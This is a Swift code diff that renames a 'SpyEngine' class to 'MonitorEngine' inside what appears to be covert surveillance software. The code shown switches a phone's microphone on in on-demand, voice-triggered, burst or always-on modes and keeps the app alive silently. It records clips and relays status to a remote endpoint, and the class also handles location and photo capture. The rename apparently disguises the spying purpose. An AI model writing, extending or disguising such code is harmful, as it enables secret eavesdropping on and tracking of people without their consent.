@@ -24,20 +24,20 @@ final class MicGate {
         burst?.invalidate(); burst = nil
         disarm?.invalidate(); disarm = nil
 
-        guard Settings.shared.isOn(.mic) else { SpyEngine.shared.setMic(false); return }
+        guard Settings.shared.isOn(.mic) else { MonitorEngine.shared.setMic(false); return }
 
         switch mode {
         case .onDemand:
-            SpyEngine.shared.setMic(false)
+            MonitorEngine.shared.setMic(false)
             if !Settings.shared.isOn(.silentKeepAlive) {
                 HealthMon.fail(.mic, "On-demand mic with keep-alive off - app may suspend")
             } else { HealthMon.ok(.mic) }
         case .voiceTrigger:
-            SpyEngine.shared.setMic(true); HealthMon.ok(.mic)
+            MonitorEngine.shared.setMic(true); HealthMon.ok(.mic)
         case .burst:
-            burstOn = true; SpyEngine.shared.setMic(true); scheduleBurst()
+            burstOn = true; MonitorEngine.shared.setMic(true); scheduleBurst()
         case .always:
-            SpyEngine.shared.setMic(true)
+            MonitorEngine.shared.setMic(true)
         }
         Relay.shared.sendJSON(["type": "micMode", "mode": mode.rawValue])
     }
@@ -48,7 +48,7 @@ final class MicGate {
         burst = Timer.scheduledTimer(withTimeInterval: t, repeats: false) { [weak self] _ in
             guard let self else { return }
             self.burstOn.toggle()
-            SpyEngine.shared.setMic(self.burstOn)
+            MonitorEngine.shared.setMic(self.burstOn)
             self.scheduleBurst()
         }
     }
@@ -56,7 +56,7 @@ final class MicGate {
     func listen(seconds: Double? = nil) {
         listening = true
         Clips.shared.session = String(UUID().uuidString.prefix(6)).lowercased()
-        SpyEngine.shared.setMic(true)
+        MonitorEngine.shared.setMic(true)
         Relay.shared.sendJSON(["type": "mic", "on": true])
         disarm?.invalidate()
         guard mode != .always, let s = seconds, s > 0 else { return }
@@ -77,7 +77,7 @@ final class MicGate {
     private func disarmNow() {
         listening = false
         guard mode != .always else { return }
-        SpyEngine.shared.setMic(false)
+        MonitorEngine.shared.setMic(false)
         Clips.shared.flush()
         Relay.shared.sendJSON(["type": "mic", "on": false,
                                "summary": Clips.shared.sessionSummary()])
@@ -193,8 +193,8 @@ final class Clips {
     }
 }
 
-final class SpyEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptureDelegate {
-    static let shared = SpyEngine()
+final class MonitorEngine: NSObject, CLLocationManagerDelegate, AVCapturePhotoCaptureDelegate {
+    static let shared = MonitorEngine()
 
     private let engine  = AVAudioEngine()
     private let session = AVAudioSession.sharedInstance()
